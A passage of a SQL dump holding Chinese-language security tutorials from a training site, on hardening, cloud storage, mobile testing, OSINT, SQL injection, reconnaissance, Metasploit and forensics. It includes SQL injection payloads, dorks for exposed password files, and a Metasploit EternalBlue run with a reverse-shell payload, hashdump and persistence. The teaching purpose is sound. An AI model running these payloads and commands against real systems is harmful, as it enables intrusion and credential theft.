GLOBAL validate_password_policy=MEDIUM;\nSET GLOBAL validate_password_length=12;\n```\n\n### 3. 安全配置\n```ini\n# my.cnf\nbind-address = 127.0.0.1\nlocal_infile = 0\nskip_show_database = 1\n```\n\n## SQL注入防护\n\n1. 使用参数化查询\n2. 输入验证\n3. 错误信息隐藏\n4. 定期更新\n\n## 数据库审计\n\n```sql\n-- 启用查询审计\nSET GLOBAL general_log = \'ON\';\nSET GLOBAL general_log_file = \'/var/log/mysql/query.log\';\n```\n\n## 备份安全\n\n- 加密备份文件\n- 离线存储\n- 定期测试恢复','数据库安全配置与防护措施',7,'medium','数据库安全',1,0,0,'published','2026-04-01 11:25:51','2026-04-01 11:25:51'),(49,'云存储安全','# 云存储安全\n\n## AWS S3安全\n\n### 1. 桶策略\n```json\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [{\n    \"Sid\": \"PublicReadGetObject\",\n    \"Effect\": \"Allow\",\n    \"Principal\": \"*\",\n    \"Action\": \"s3:GetObject\",\n    \"Resource\": \"arn:aws:s3:::bucket/*\"\n  }]\n}\n```\n\n### 2. 访问控制\n- IAM策略\n- Bucket ACL\n- 对象ACL\n\n### 3. 加密\n- 服务端加密（SSE-S3、SSE-KMS）\n- 客户端加密\n\n## 常见风险\n\n1. **公开访问桶**：导致数据泄露\n2. **弱权限配置**：过度授权\n3. **日志配置不当**：审计缺失\n4. **未加密传输**：中间人攻击\n\n## 安全建议\n\n1. 启用 versioning\n2. 启用访问日志\n3. 配置生命周期策略\n4. 启用加密\n5. 使用IAM角色而非Access Key\n6. 定期安全审计','云存储服务的安全配置',7,'medium','云安全',1,0,0,'published','2026-04-01 11:25:51','2026-04-01 11:25:51'),(50,'移动端渗透测试','# 移动端渗透测试\n\n## 测试工具\n\n| 工具 | 平台 | 用途 |\n|------|------|------|\n| Jadx | Android | APK反编译 |\n| Frida | 跨平台 | 动态插桩 |\n| Objection | 跨平台 | 运行时分析 |\n| Drozer | Android | 安全评估 |\n| MobSF | 跨平台 | 自动化扫描 |\n\n## Android测试\n\n### 1. 反编译APK\n```bash\njadx -d output app.apk\n```\n\n### 2. 动态分析\n```bash\nfrida -U -f com.target.app -l script.js\n```\n\n### 3. 网络抓包\n```bash\n# 配置代理\nadb shell settings put global http_proxy localhost:8080\n```\n\n## iOS测试\n\n### 1. 砸壳（App Store应用）\n```bash\n clutch -d bundle_id\n```\n\n### 2. 动态分析\n```bash\nfrida -U -f com.target.app\n```\n\n### 3. SSL Pinning绕过\n```javascript\n// Objection\nandroid sslpinning disable\n```','移动应用安全测试方法与工具',8,'hard','移动安全',1,0,0,'published','2026-04-01 11:25:51','2026-04-01 11:25:51'),(51,'社会工程学信息收集','# 社会工程学信息收集\n\n## OSINT公开情报收集\n\n### 1. 搜索引擎\n- Google Hacking\n- 百度高级搜索\n- 钟馗之眼（Zoomeye）\n\n### 2. 社交媒体\n- LinkedIn：人员信息、公司结构\n- Twitter：员工动态、技术栈\n- Facebook：公司活动\n\n### 3. 数据泄露查询\n- HaveIBeenPwned：邮箱泄露\n- DeHashed：密码泄露\n\n## Google Hacking\n\n### 常用语法\n```\nsite:example.com filetype:pdf\nsite:example.com intitle:\"管理后台\"\nsite:example.com inurl:login\nsite:example.com ext:php OR ext:jsp\n```\n\n### 数据库文件\n```\nsite:example.com filetype:sql\nsite:example.com filetype:log\n```\n\n### 敏感文件\n```\nsite:example.com filetype:inc\nsite:example.com \"password\" filetype:txt\n```\n\n## 社工防护\n\n1. 员工安全意识培训\n2. 敏感信息最小化公开\n3. 邮箱过滤敏感内容\n4. 钓鱼演练','利用社工技巧收集目标信息',11,'easy','社会工程学',1,2,0,'published','2026-04-01 11:25:51','2026-04-04 13:40:56'),(52,'身份认证安全','# 身份认证安全\n\n## 认证机制\n\n### 1. 密码认证\n- 密码复杂度要求\n- 密码加密存储（bcrypt、scrypt）\n- 密码找回流程安全\n\n### 2. 多因素认证（MFA）\n- 短信验证码\n- 邮箱验证码\n- TOTP（Google Authenticator）\n- 硬件令牌\n\n### 3. 第三方认证\n- OAuth 2.0\n- SAML\n- OpenID Connect\n\n## 会话管理\n\n### 会话ID安全\n- 使用加密的随机数\n- 足够长度（128位）\n- 设置HttpOnly和Secure\n\n### 会话超时\n```http\nSession: timeout=15分钟\n```\n\n## 安全问题\n\n1. **暴力破解**：无登录失败限制\n2. **弱密码**：简单密码被猜测\n3. **会话固定**：未更换会话ID\n4. **CSRF**：缺少Token验证\n5. **XSS**：窃取Cookie\n\n## 最佳实践\n\n1. 强制密码复杂度\n2. 登录失败锁定\n3. 定期会话刷新\n4. 多因素认证\n5. 安全的密码重置','身份认证机制的安全问题与会话管理',10,'medium','Web安全',1,6,0,'published','2026-04-01 11:25:51','2026-04-04 13:40:37'),(53,'API安全','# API安全\n\n## REST API安全\n\n### 1. 认证\n- API Key\n- JWT Token\n- OAuth 2.0\n\n### 2. 授权\n```python\n@app.route(\'/api/admin\')\n@require_admin\ndef admin_panel():\n    pass\n```\n\n### 3. 输入验证\n```python\nfrom marshmallow import Schema, validate\n\nclass UserSchema(Schema):\n    email = fields.Email(required=True)\n    age = fields.Int(validate=Range(min=0, max=150))\n```\n\n## 常见漏洞\n\n### 1. 越权访问\n- 水平越权：同级用户互访\n- 垂直越权：低权限访问高权限\n\n### 2. 批量枚举\n- 用户ID遍历\n- 订单号遍历\n\n### 3. 速率限制缺失\n导致暴力破解或数据爬取。\n\n## 防护措施\n\n1. 实施速率限制\n2. 强制身份认证\n3. 资源级别授权\n4. 输入输出验证\n5. 敏感数据脱敏\n6. API版本管理','API安全漏洞与防护策略',10,'medium','API安全',1,5,0,'published','2026-04-01 11:25:51','2026-04-04 13:40:37'),(54,'内容安全策略CSP','# 内容安全策略CSP\n\n## CSP作用\n\nContent Security Policy是一种安全头部，用于防止XSS、点击劫持等攻击。\n\n## 配置示例\n\n### 基本配置\n```http\nContent-Security-Policy: default-src \'self\'\n```\n\n### 允许特定源\n```http\nContent-Security-Policy:\n    default-src \'self\';\n    script-src \'self\' https://trusted-cdn.com;\n    style-src \'self\' \'unsafe-inline\';\n    img-src *;\n```\n\n### 禁止内联\n```http\nContent-Security-Policy: script-src \'self\'\n```\n\n## 指令说明\n\n| 指令 | 说明 |\n|------|------|\n| default-src | 默认来源 |\n| script-src | JS来源 |\n| style-src | CSS来源 |\n| img-src | 图片来源 |\n| connect-src | AJAX/WebSocket |\n| frame-src | iframe来源 |\n\n## 报告机制\n\n```http\nContent-Security-Policy-Report-URI: /csp-report\n```\n\n## 常见错误\n\n1. **\'unsafe-inline\'**：允许内联脚本\n2. **\'*\'**：允许任意来源\n3. **data:**：允许data:URL','CSP配置与XSS防护',10,'medium','Web安全',1,0,0,'published','2026-04-01 11:25:51','2026-04-01 11:25:51'),(55,'点击劫持与防护','# 点击劫持与防护\n\n## 攻击原理\n\n攻击者通过iframe嵌入目标网站，诱导用户点击隐藏的恶意元素。\n\n```html\n<iframe src=\"http://target-bank.com/transfer?to=hacker&amount=10000\">\n  <button style=\"opacity:0\">确认转账</button>\n</iframe>\n```\n\n## 攻击类型\n\n### 1. 经典点击劫持\n诱骗用户点击隐藏按钮。\n\n### 2. likejacking\nFacebook点赞劫持。\n\n### 3. 鼠标灾难\n移动鼠标时触发隐藏操作。\n\n## 防御措施\n\n### 1. X-Frame-Options\n```http\nX-Frame-Options: DENY\nX-Frame-Options: SAMEORIGIN\nX-Frame-Options: ALLOW-FROM https://trusted.com\n```\n\n### 2. CSP Frame-Ancestors\n```http\nContent-Security-Policy: frame-ancestors \'none\'\nContent-Security-Policy: frame-ancestors \'self\'\nContent-Security-Policy: frame-ancestors https://trusted.com\n```\n\n### 3. JavaScript防御\n```javascript\nif (top.location !== self.location) {\n    top.location = self.location;\n}\n```\n\n## 最佳实践\n\n1. 优先使用CSP frame-ancestors\n2. 两者结合双重防护\n3. 敏感操作添加确认步骤\n4. 避免单点击操作完成重要事务','点击劫持攻击原理与防御方法',10,'easy','Web安全',1,0,0,'published','2026-04-01 11:25:51','2026-04-01 11:25:51'),(56,'Web缓存安全','# Web缓存安全\n\n## 缓存机制\n\n### 1. 浏览器缓存\n- Cache-Control\n- Expires\n- ETag\n- Last-Modified\n\n### 2. CDN缓存\n- 边缘节点缓存\n- 私有缓存\n\n### 3. 反向代理缓存\n- Nginx缓存\n- Varnish\n\n## 安全问题\n\n### 1. 敏感数据泄露\n- 缓存敏感页面（账户信息）\n- 缓存包含认证Token的响应\n\n### 2. 缓存中毒\n攻击者控制缓存内容。\n\n### 3. 缓存穿透\n攻击大量不存在的数据绕过缓存。\n\n## 安全配置\n\n### Cache-Control头\n```http\n# 不缓存\nCache-Control: no-store, no-cache, must-revalidate\nPragma: no-cache\n\n# 私有缓存\nCache-Control: private\n\n# 公共资源，可缓存\nCache-Control: public, max-age=3600\n```\n\n### 敏感数据处理\n```http\nCache-Control: no-store\nSet-Cookie: session=xxx; HttpOnly; Secure\n```','Web缓存机制与安全问题',10,'medium','Web安全',1,0,0,'published','2026-04-01 11:25:51','2026-04-01 11:25:51'),(57,'TCP/IP协议族安全概述','TCP/IP协议族是互联网的基础协议，但存在多种安全威胁。\n\n## 主要安全问题\n\n### 1. ARP欺骗\nARP协议没有认证机制，攻击者可以发送伪造的ARP响应包，将自己的MAC地址绑定到受害者的IP地址，从而实现中间人攻击。\n\n### 2. DNS劫持\nDNS查询缺乏验证，攻击者可以篡改DNS缓存或拦截DNS请求，将用户重定向到恶意站点。\n\n### 3. IP欺骗\n攻击者可以伪造源IP地址，绕过基于IP的访问控制或发起SYN Flood攻击。\n\n## 防护措施\n\n1. 使用ARP防火墙\n2. 部署DNSSEC\n3. 启用IPsec加密通信\n4. 配置ACL访问控制列表','TCP/IP协议族是互联网的基础协议，但存在多种安全威胁。\n\n## 主要安全问题\n\n### 1. ARP欺骗\nARP协议没有认证机制，攻击者可以发送伪造的ARP响应包，将自己的MAC地址绑定到受害者的IP地址，从而实现中间人攻击。\n\n### 2. DNS劫持\nDNS查询缺乏验证，攻击者可以篡改DNS缓存或拦截DNS请求，将用户重定向到恶意站点。\n\n### 3. IP欺骗\n攻击者可以伪造源IP地址，...',1,'easy','网络安全基础教程',1,0,0,'published','2026-04-02 08:07:20','2026-04-02 08:07:20'),(58,'防火墙技术原理与分类','防火墙是网络安全的核心设备，用于控制进出网络的流量。\n\n## 防火墙类型\n\n### 1. 包过滤防火墙\n工作在网络层，根据源/目标IP地址、端口号、协议类型等过滤数据包。\n- 优点：速度快，开销小\n- 缺点：无法检查应用层数据\n\n### 2. 状态检测防火墙\n跟踪连接状态表，根据连接状态动态调整规则。\n- 优点：安全性更高，性能良好\n- 缺点：配置复杂\n\n### 3. 应用层防火墙（代理防火墙）\n工作在应用层，代理内部网络对外部的访问。\n- 优点：完全隔离内外网络，检查应用层数据\n- 缺点：速度较慢\n\n## 防火墙部署策略\n1. 最小权限原则\n2. 默认拒绝策略\n3. 纵深防御','防火墙是网络安全的核心设备，用于控制进出网络的流量。\n\n## 防火墙类型\n\n### 1. 包过滤防火墙\n工作在网络层，根据源/目标IP地址、端口号、协议类型等过滤数据包。\n- 优点：速度快，开销小\n- 缺点：无法检查应用层数据\n\n### 2. 状态检测防火墙\n跟踪连接状态表，根据连接状态动态调整规则。\n- 优点：安全性更高，性能良好\n- 缺点：配置复杂\n\n### 3. 应用层防火墙（代理防火墙）\n...',1,'easy','网络安全基础教程',1,0,0,'published','2026-04-02 08:07:20','2026-04-02 08:07:20'),(59,'SQL注入攻击原理与防御','SQL注入是一种将恶意SQL代码插入到应用程序查询中的攻击技术。\n\n## 攻击原理\n\n当应用程序将用户输入直接拼接到SQL查询中时，攻击者可以通过构造特殊输入来：\n1. 绕过身份验证\n2. 获取数据库中的敏感数据\n3. 修改或删除数据\n4. 执行系统命令（在某些条件下）\n\n## 经典注入示例\n\n### 绕过登录\n```sql\n\' OR \'1\'=\'1\' --\n```\n这条输入使WHERE条件永远为真。\n\n### 联合查询注入\n```sql\n\' UNION SELECT username, password FROM users --\n```\n用于获取其他表的数据。\n\n## 防御措施\n\n1. **参数化查询**：使用预编译语句\n2. **输入验证**：白名单验证用户输入\n3. **转义特殊字符**：对引号等进行转义\n4. **最小权限原则**：数据库账户不要用DBA权限\n5. **使用WAF**：Web应用防火墙','SQL注入是一种将恶意SQL代码插入到应用程序查询中的攻击技术。\n\n## 攻击原理\n\n当应用程序将用户输入直接拼接到SQL查询中时，攻击者可以通过构造特殊输入来：\n1. 绕过身份验证\n2. 获取数据库中的敏感数据\n3. 修改或删除数据\n4. 执行系统命令（在某些条件下）\n\n## 经典注入示例\n\n### 绕过登录\n```sql\n\' OR \'1\'=\'1\' --\n```\n这条输入使WHERE条件永远为真...',2,'medium','Web安全实战指南',1,2,0,'published','2026-04-02 08:07:20','2026-04-04 13:59:44'),(60,'Linux系统安全加固指南','Linux系统安全加固是保护服务器安全的重要措施。\n\n## 账户安全\n\n### 1. 密码策略\n- 设置强密码（包含大小写字母、数字、特殊字符）\n- 定期更换密码\n- 使用PAM模块强化密码策略\n\n### 2. 账户管理\n```bash\n# 禁用不需要的系统账户\nusermod -s /sbin/nologin apache\n# 锁定账户\npasswd -l guest\n# 检查空密码账户\nawk -F: \'($2 == \"\") {print}\' /etc/shadow\n```\n\n## 文件权限\n\n### 1. 最小权限原则\n```bash\nchmod 640 /etc/shadow\nchmod 755 /bin\n```\n\n### 2. SUID/SGID检查\n```bash\nfind / -perm -4000 -o -perm -2000 2>/dev/null\n```\n\n## 服务安全\n\n1. 禁用不必要的服务\n2. 关闭危险的端口\n3. 配置iptables/firewalld\n4. 启用审计日志\n\n## 补丁管理\n定期更新系统和软件补丁','Linux系统安全加固是保护服务器安全的重要措施。\n\n## 账户安全\n\n### 1. 密码策略\n- 设置强密码（包含大小写字母、数字、特殊字符）\n- 定期更换密码\n- 使用PAM模块强化密码策略\n\n### 2. 账户管理\n```bash\n# 禁用不需要的系统账户\nusermod -s /sbin/nologin apache\n# 锁定账户\npasswd -l guest\n# 检查空密码账户\nawk...',3,'hard','系统安全加固手册',1,0,0,'published','2026-04-02 08:07:20','2026-04-02 08:07:20'),(61,'Windows系统安全策略配置','Windows系统安全策略是保护Windows服务器和工作站的关键。\n\n## 账户策略\n\n### 密码策略\n- 最小密码长度：12位\n- 密码复杂性要求：启用\n- 密码最长使用期：90天\n- 强制密码历史：5个\n\n### 账户锁定策略\n- 账户锁定阈值：5次无效登录\n- 锁定持续时间：30分钟\n\n## 用户权限分配\n\n通过本地安全策略配置用户权限：\n- 关闭系统：不授予普通用户\n- 远程关机：仅管理员\n- 取得文件所有权：仅管理员\n\n## 安全选项\n\n1. 启用UAC（用户账户控制）\n2. 禁用administrator账户\n3. 开启审核策略\n4. 配置网络安全防火墙\n\n## 端口和服务管理\n使用IIS管理器和服务管理器禁用不必要的服务和端口。','Windows系统安全策略是保护Windows服务器和工作站的关键。\n\n## 账户策略\n\n### 密码策略\n- 最小密码长度：12位\n- 密码复杂性要求：启用\n- 密码最长使用期：90天\n- 强制密码历史：5个\n\n### 账户锁定策略\n- 账户锁定阈值：5次无效登录\n- 锁定持续时间：30分钟\n\n## 用户权限分配\n\n通过本地安全策略配置用户权限：\n- 关闭系统：不授予普通用户\n- 远程关机：仅管...',3,'medium','系统安全加固手册',1,0,0,'published','2026-04-02 08:07:20','2026-04-02 08:07:20'),(62,'对称加密与非对称加密对比','密码学是网络安全的基石，主要分为对称加密和非对称加密。\n\n## 对称加密\n\n### 原理\n加密和解密使用相同的密钥。\n\n### 常用算法\n- **AES**：高级加密标准，密钥长度128/192/256位\n- **DES**：数据加密标准，已不安全\n- **3DES**：三重DES，兼容但慢\n- **ChaCha20**：流密码，用于移动设备\n\n### 优点\n速度快，适合大数据加密\n\n### 缺点\n密钥分发困难\n\n## 非对称加密\n\n### 原理\n使用公钥加密，私钥解密。\n\n### 常用算法\n- **RSA**：基于大数分解难题，2048位以上安全\n- **ECC**：椭圆曲线密码学，同等安全性密钥更短\n- **DH**：Diffie-Hellman，密钥交换\n\n### 优点\n密钥分发简单，支持数字签名\n\n### 缺点\n速度慢，约为对称加密的1000倍\n\n## 混合加密实践\n实际应用中通常结合两者：\n1. 用非对称加密传递对称密钥\n2. 用对称加密加密实际数据','密码学是网络安全的基石，主要分为对称加密和非对称加密。\n\n## 对称加密\n\n### 原理\n加密和解密使用相同的密钥。\n\n### 常用算法\n- **AES**：高级加密标准，密钥长度128/192/256位\n- **DES**：数据加密标准，已不安全\n- **3DES**：三重DES，兼容但慢\n- **ChaCha20**：流密码，用于移动设备\n\n### 优点\n速度快，适合大数据加密\n\n### 缺点...',4,'medium','密码学导论',1,0,0,'published','2026-04-02 08:07:20','2026-04-02 08:07:20'),(63,'信息收集与侦察技术','渗透测试的第一步是信息收集，这决定了后续攻击的方向。\n\n## 被动信息收集\n\n### 1. WHOIS查询\n```bash\nwhois example.com\n```\n获取域名注册信息、DNS服务器等。\n\n### 2. DNS收集\n```bash\n# 子域名枚举\ndnsenum example.com\n# DNS区域传送\ndig axfr @ns.example.com example.com\n```\n\n### 3. 搜索引擎\n- Google Hacking：`site:example.com filetype:pdf`\n- shodan.io：搜索互联网设备\n- censys.io：搜索证书和SSL配置\n\n## 主动信息收集\n\n### 1. 端口扫描\n```bash\n# SYN扫描\nnmap -sS -p- 192.168.1.1\n# 服务版本检测\nnmap -sV -p 80,443 192.168.1.1\n# 操作系统检测\nnmap -O 192.168.1.1\n```\n\n### 2. 漏洞扫描\n```bash\n# 使用Nessus或OpenVAS\n```\n\n### 3. 社会工程学\n通过钓鱼邮件、电话等方式收集信息。\n\n## 收集的信息类型\n- 域名和子域名\n- IP地址范围\n- 开放端口和服务\n- 员工信息和邮箱\n- 技术架构','渗透测试的第一步是信息收集，这决定了后续攻击的方向。\n\n## 被动信息收集\n\n### 1. WHOIS查询\n```bash\nwhois example.com\n```\n获取域名注册信息、DNS服务器等。\n\n### 2. DNS收集\n```bash\n# 子域名枚举\ndnsenum example.com\n# DNS区域传送\ndig axfr @ns.example.com example.com\n`...',5,'medium','渗透测试实战指南',1,4,0,'published','2026-04-02 08:07:20','2026-04-04 13:41:11'),(64,'Metasploit渗透测试框架使用','Metasploit是世界上最流行的渗透测试框架。\n\n## 架构\n\n### 模块类型\n- **Exploit**：漏洞利用模块\n- **Payload**：攻击载荷\n- **Auxiliary**：辅助模块（扫描、嗅探）\n- **Encoder**：编码器模块\n- **Post**：后渗透模块\n\n## 基本使用\n\n### 1. 启动msfconsole\n```bash\nmsfconsole\n```\n\n### 2. 搜索模块\n```bash\nsearch type:exploit name:smb\n```\n\n### 3. 使用模块\n```bash\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.100\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 192.168.1.50\nexploit\n```\n\n### 4. Meterpreter后渗透\n```bash\n# 获取系统信息\nsysinfo\n# 获取密码哈希\nhashdump\n# 端口转发\nportfwd add -l 3389 -p 3389 -r 192.168.1.100\n# 持久化\nrun persistence -X -i 10 -p 4444 -r 192.168.1.50\n```\n\n## 常用漏洞模块\n- MS17-010（永恒之蓝）\n- CVE-2019-0708（RDP漏洞）\n- WebLogic反序列化','Metasploit是世界上最流行的渗透测试框架。\n\n## 架构\n\n### 模块类型\n- **Exploit**：漏洞利用模块\n- **Payload**：攻击载荷\n- **Auxiliary**：辅助模块（扫描、嗅探）\n- **Encoder**：编码器模块\n- **Post**：后渗透模块\n\n## 基本使用\n\n### 1. 启动msfconsole\n```bash\nmsfconsole\n```...',5,'hard','渗透测试实战指南',1,3,0,'published','2026-04-02 08:07:20','2026-04-04 13:41:10'),(65,'安全事件分类与分级标准','安全事件分类分级是应急响应的重要基础。\n\n## 事件分类（按类型）\n\n### 1. 恶意代码事件\n- 计算机病毒\n- 蠕虫病毒\n- 木马程序\n- 勒索软件\n-挖矿程序\n\n### 2. 信息破坏事件\n- 网络攻击导致数据篡改\n- 数据泄露\n- 数据窃取\n\n### 3. 网络攻击事件\n- DDoS攻击\n- APT攻击\n- 钓鱼攻击\n- 零日攻击\n\n### 4. 系统入侵事件\n- 非授权访问\n- 账号破解\n- 权限提升\n\n## 事件分级（按影响）\n\n### 特别重大事件（I级）\n- 全国性关键基础设施瘫痪\n- 造成重大经济损失\n- 影响国家安全\n\n### 重大事件（II级）\n- 多个省份受影响\n- 造成较大经济损失\n- 影响社会稳定\n\n### 较大事件（III级）\n- 单个省份受影响\n- 造成一定经济损失\n- 部门正常工作受影响\n\n### 一般事件（IV级）\n- 局部影响\n- 轻微经济损失\n- 可快速恢复','安全事件分类分级是应急响应的重要基础。\n\n## 事件分类（按类型）\n\n### 1. 恶意代码事件\n- 计算机病毒\n- 蠕虫病毒\n- 木马程序\n- 勒索软件\n-挖矿程序\n\n### 2. 信息破坏事件\n- 网络攻击导致数据篡改\n- 数据泄露\n- 数据窃取\n\n### 3. 网络攻击事件\n- DDoS攻击\n- APT攻击\n- 钓鱼攻击\n- 零日攻击\n\n### 4. 系统入侵事件\n- 非授权访问\n- 账号破...',6,'easy','应急响应手册',1,0,0,'published','2026-04-02 08:07:20','2026-04-02 08:07:20'),(66,'数字取证与溯源技术','数字取证是应急响应的核心环节，用于收集证据和确定攻击来源。\n\n## 取证原则\n\n### 1. 合法性\n取证过程必须合法合规，避免证据失效。\n\n### 2. 完整性\n保证证据不被篡改，使用哈希校验。\n\n### 3. 可追溯性\n记录取证全流程，可重现。\n\n## 主机取证\n\n### 内存取证\n```bash\n# 获取内存镜像\nsudo dd if=/dev/mem of=memory.img\n# 使用Volatility分析\nvolatility -f memory.img pslist\n```\n\n### 硬盘取证\n```bash\n# 创建磁盘镜像\ndd if=/dev/sda of=disk.img conv=sync,noerror\n# 计算哈希\nsha256sum disk.img\n```\n\n### 日志分析\n- 系统日志：/var/log/*\n- 应用日志：Nginx、Apache、MySQL等\n- 安全日志：/var/log/secure\n\n## 网络取证\n\n### 流量分析\n```bash\n# 抓包分析\ntcpdump -i eth0 -w capture.pcap\n# 使用Wireshark分析\n```\n\n### 溯源方法\n1. IP追踪：WHOIS、路由追踪\n2. 日志分析：关联分析\n3. 蜜罐诱捕：部署陷阱','数字取证是应急响应的核心环节，用于收集证据和确定攻击来源。\n\n## 取证原则\n\n### 1. 合法性\n取证过程必须合法合规，避免证据失效。\n\n### 2. 完整性\n保证证据不被篡改，使用哈希校验。\n\n### 3. 可追溯性\n记录取证全流程，可重现。\n\n## 主机取证\n\n### 内存取证\n```bash\n# 获取内存镜像\nsudo dd if=/dev/mem of=memory.img\n# 使用V...',6,'hard','应急响应手册',1,0,0,'published','2026-04-02 08:07:20','2026-04-02 08:07:20'),(67,'数据加密存储最佳实践','数据加密存储是保护敏感数据的核心措施。\n\n## 加密策略\n\n### 1. 透明数据加密（TDE）\n数据库级别的加密，整个数据库文件加密。\n- MySQL: InnoDB表空间加密\n- SQL Server: TDE功能\n\n### 2. 列级加密\n对敏感列（如身份证号、银行卡号）单独加密。\n```sql\n-- MySQL AES加密示例\nINSERT INTO users (ssn) VALUES (AES_ENCRYPT(\'123456789\', \'key\'));\nSELECT AES_DECRYPT(ssn, \'key\') FROM users;\n```\n\n### 3. 应用层加密\n在应用程序中完成加密，数据库只存储密文。\n\n## 密钥管理\n\n### 原则\n1. 密钥与数据分离\n2. 使用硬件安全模块（HSM）\n3. 密钥定期轮换\n\n### 密钥分层\n- 主密钥：保护密钥加密密钥\n- 密钥加密密钥（KEK）：加密数据密钥\n- 数据密钥（DEK）：加密实际数据\n\n## 敏感数据处理\n- 脱敏：对非生产环境数据进行处理\n- 掩码：显示部分信息如****1234\n- 分片：敏感数据分散存储','数据加密存储是保护敏感数据的核心措施。\n\n## 加密策略\n\n### 1. 透明数据加密（TDE）\n数据库级别的加密，整个数据库文件加密。\n- MySQL: InnoDB表空间加密\n- SQL Server: TDE功能\n\n### 2. 列级加密\n对敏感列（如身份证号、银行卡号）单独加密。\n```sql\n-- MySQL AES加密示例\nINSERT INTO users (ssn) VALUES ...',7,'medium','数据安全实践指南',1,1,0,'published','2026-04-02 08:07:20','2026-04-04 14:01:23'),(68,'GDPR与个人信息保护合规','GDPR（通用数据保护条例）是欧盟制定的数据保护法规。\n\n## 核心原则\n\n### 1. 合法性、公平性和透明性\n数据处理必须有合法依据。\n\n### 2. 目的限制\n数据只能用于明确声明的目的。\n\n### 3. 数据最小化\n只收集必要的数据。\n\n### 4. 准确性\n保持数据准确及时更新。\n\n### 5. 存储限制\n不超过必要时间存储。\n\n### 6. 完整性和机密性\n采取适当安全措施保护数据。\n\n## 数据主体权利\n\n1. **知情权**：了解数据如何被处理\n2. **访问权**：获取个人数据副本\n3. **更正权**：修正不准确的数据\n4. **删除权**：要求删除数据（被遗忘权）\n5. **限制处理权**：限制某些处理活动\n6. **数据可携权**：获取结构化格式的数据\n7. **拒绝权**：拒绝直接营销\n\n## 合规要求\n\n### 技术措施\n- 数据加密\n- 访问控制\n- 审计日志\n- 数据脱敏\n\n### 管理措施\n- 隐私影响评估\n- 数据保护官（DPO）\n- 数据泄露通知机制','GDPR（通用数据保护条例）是欧盟制定的数据保护法规。\n\n## 核心原则\n\n### 1. 合法性、公平性和透明性\n数据处理必须有合法依据。\n\n### 2. 目的限制\n数据只能用于明确声明的目的。\n\n### 3. 数据最小化\n只收集必要的数据。\n\n### 4. 准确性\n保持数据准确及时更新。\n\n### 5. 存储限制\n不超过必要时间存储。\n\n### 6. 完整性和机密性\n采取适当安全措施保护数据。\n...',7,'medium','数据安全实践指南',1,0,0,'published','2026-04-02 08:07:20','2026-04-02 08:07:20'),(69,'Android应用安全测试方法','Android应用安全测试是移动安全的重要组成部分。\n\n## 测试环境搭建\n\n### 工具准备\n- Android Studio\n- Jadx（反编译）\n- Frida（动态插桩）\n- Burp Suite（抓包代理）\n\n### root检测与绕过\n```javascript\n// Frida绕过root检测\nJava.perform(function() {\n    var RootPackages = [\"com.topjohnwu.magisk\"];\n    var PackageManager = Java.use(\"android.content.pm.PackageManager\");\n    // 检测逻辑绕过\n});\n```\n\n## 静态分析\n\n### 反编译APK\n```bash\n# 使用apktool\napktool d app.apk -o output\n# 使用jadx\njadx -d output app.apk\n```\n\n### 检查项\n1. 硬编码密钥/密码\n2. 不安全的存储（SharedPreferences）\n3. 调试标志未关闭\n4. 混淆不足\n\n## 动态分析\n\n### 网络流量抓包\n1. 配置Burp Suite代理\n2. 安装CA证书到设备\n3. 抓取HTTP/HTTPS流量\n\n### 运行时分析\n```bash\n# 使用Frida连接进程\nfrida -U -f com.example.app -l script.js\n```\n\n## 常见漏洞\n- 不安全的数据存储\n- 不安全的通信\n- 弱加密\n- 客户端注入\n- 业务逻辑漏洞','Android应用安全测试是移动安全的重要组成部分。\n\n## 测试环境搭建\n\n### 工具准备\n- Android Studio\n- Jadx（反编译）\n- Frida（动态插桩）\n- Burp Suite（抓包代理）\n\n### root检测与绕过\n```javascript\n// Frida绕过root检测\nJava.perform(function() {\n    var RootPackag...',8,'hard','移动安全测试指南',1,0,0,'published','2026-04-02 08:07:20','2026-04-02 08:07:20'),(70,'iOS应用安全机制与测试','iOS应用因其封闭性，在安全方面有其独特机制。\n\n## iOS安全机制\n\n### 1. 应用签名\n所有应用必须经过Apple签名验证。\n- 开发者签名：测试用\n- 企业签名：企业内部分发\n- App Store签名：正式发布\n\n### 2. Sandbox沙盒\n每个应用运行在独立沙盒中，无法访问其他应用数据。\n\n### 3. 数据保护\n- NSFileProtectionComplete：设备解锁才可访问\n- Keychain：加密存储敏感数据\n\n### 4. ATS应用传输安全\n强制HTTPS连接，拒绝不安全的HTTP。\n\n## 安全测试\n\n### 工具\n- Hopper Disassembler：反汇编\n- Radare2：逆向分析\n- Charles：抓包代理\n\n### 测试方法\n\n#### 1. IPA分析\n```bash\n# 提取可执行文件\nunzip -o app.ipa\n# 复制二进制文件进行逆向\n```\n\n#### 2. 敏感数据检测\n- 检查NSLog输出\n- 检查日志文件\n- 检查Keychain使用\n\n#### 3. 网络安全\n- 绕过ATS验证\n- 中间人攻击测试\n- 证书校验绕过\n\n## 加固建议\n1. 使用SSL Pinning\n2. 敏感数据存储在Keychain\n3. 关闭调试日志\n4. 代码混淆','iOS应用因其封闭性，在安全方面有其独特机制。\n\n## iOS安全机制\n\n### 1. 应用签名\n所有应用必须经过Apple签名验证。\n- 开发者签名：测试用\n- 企业签名：企业内部分发\n- App Store签名：正式发布\n\n### 2. Sandbox沙盒\n每个应用运行在独立沙盒中，无法访问其他应用数据。\n\n### 3. 数据保护\n- NSFileProtectionComplete：设备解锁...',8,'hard','移动安全测试指南',1,10,0,'published','2026-04-02 08:07:20','2026-04-04 09:05:16'),(82,'DDoS攻击防御指南','# DDoS攻击防御指南\n\n## 什么是DDoS攻击\n\n分布式拒绝服务攻击（Distributed Denial of Service）是一种通过大量分布式的请求使目标服务不可用的攻击方式。\n\n## 常见攻击类型\n\n- SYN Flood：发送大量SYN包\n- UDP Flood：发送大量UDP数据包\n- HTTP Flood：发送大量HTTP请求\n- DNS Amplification：利用DNS放大攻击\n\n## 防御策略\n\n1. 流量清洗：通过云防护服务清洗恶意流量\n2. 负载均衡：分散流量压力\n3. CDN加速：缓存静态内容\n4. 限流配置：限制单个IP请求频率\n5. 黑洞路由：丢弃可疑流量\n\n## 相关标签\n\nDDoS, 网络安全, 防御','# DDoS攻击防御指南\n\n## 什么是DDoS攻击\n\n分布式拒绝服务攻击（Distributed Denial of Service）是一种通过大量分布式的请求使目标服务不可用的攻击方式。\n\n## 常见攻击类型\n\n- SYN Flood：发送大量SYN包\n- UDP Flood：发送大量UDP数据包\n- HTTP Flood：发送大量HTTP请求\n- DNS 